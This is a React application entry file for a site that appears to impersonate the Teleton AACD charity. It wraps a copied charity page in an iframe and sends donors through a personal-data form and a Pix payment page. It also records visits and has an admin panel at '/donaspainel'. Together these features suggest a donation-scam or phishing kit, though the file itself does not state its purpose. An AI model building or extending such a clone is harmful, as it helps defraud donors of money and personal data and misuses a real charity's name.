import React, { useEffect, useRef, useState } from "react";
import "./App.css";
import { BrowserRouter, Routes, Route, Navigate, useNavigate } from "react-router-dom";
import axios from "axios";
import PixPaymentPage from "./components/PixPaymentPage";
import LoginPage from "./components/LoginPage";
import AdminDashboard from "./components/AdminDashboard";

import DonorDataPage from "./components/DonorDataPage";

const API = '/api';

const HomePage = () => {
  const navigate = useNavigate();
  const iframeRef = useRef(null);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const mq = window.matchMedia('(max-width: 1024px)');
    setIsMobile(mq.matches);
    const onChange = (e) => setIsMobile(e.matches);
    mq.addEventListener('change', onChange);

    const handler = (event) => {
      const data = event.data || {};
      if (data.type === 'aacd-donate') {
        const value = parseFloat(data.value) || 55;
        navigate('/doacao/dados', { state: { value } });
      }
    };
    window.addEventListener('message', handler);
    return () => {
      window.removeEventListener('message', handler);
      mq.removeEventListener('change', onChange);
    };
  }, [navigate]);

  const handleMobileConfirm = () => {
    const win = iframeRef.current && iframeRef.current.contentWindow;
    if (win) win.postMessage({ type: 'aacd-confirm-request' }, '*');
  };

  return (
    <div style={{ position: 'relative', minHeight: '100vh' }}>
      <iframe
        ref={iframeRef}
        title="Teleton AACD"
        src="/aacd.html?v=20260606d"
        data-testid="home-aacd-frame"
        style={{ border: 'none', width: '100%', height: '100vh', display: 'block' }}
      />
      {isMobile && (
        <button
          data-testid="mobile-confirm-donation-btn"
          onClick={handleMobileConfirm}
          style={{
            position: 'fixed',
            left: 0,
            right: 0,
            bottom: 0,
            width: '100%',
            zIndex: 2147483000,
            border: 'none',
            background: '#eb1941',
            color: '#fff',
            fontFamily: 'Montserrat, sans-serif',
            fontWeight: 700,
            fontSize: '16px',
            textTransform: 'uppercase',
            letterSpacing: '0.5px',
            padding: '16px 14px',
            boxShadow: '0 -2px 12px rgba(0,0,0,0.18)',
            cursor: 'pointer',
          }}
        >
          Confirmar Doação
        </button>
      )}
    </div>
  );
};

function App() {
  useEffect(() => {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    axios.post(`${API}/admin/visits/track`, { device: isMobile ? 'Mobile' : 'Desktop', origin: window.location.hostname }).catch(() => {});
  }, []);

  return (
    <div className="App">
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<HomePage />} />
          <Route path="/doacao/dados" element={<DonorDataPage />} />
          <Route path="/doacao/pix" element={<PixPaymentPage />} />
          <Route path="/donaspainel" element={<LoginPage />} />
          <Route path="/donaspainel/dashboard" element={<AdminDashboard />} />
          <Route path="*" element={<Navigate to="/" replace />} />
        </Routes>
      </BrowserRouter>
    </div>
  );
}

export default App;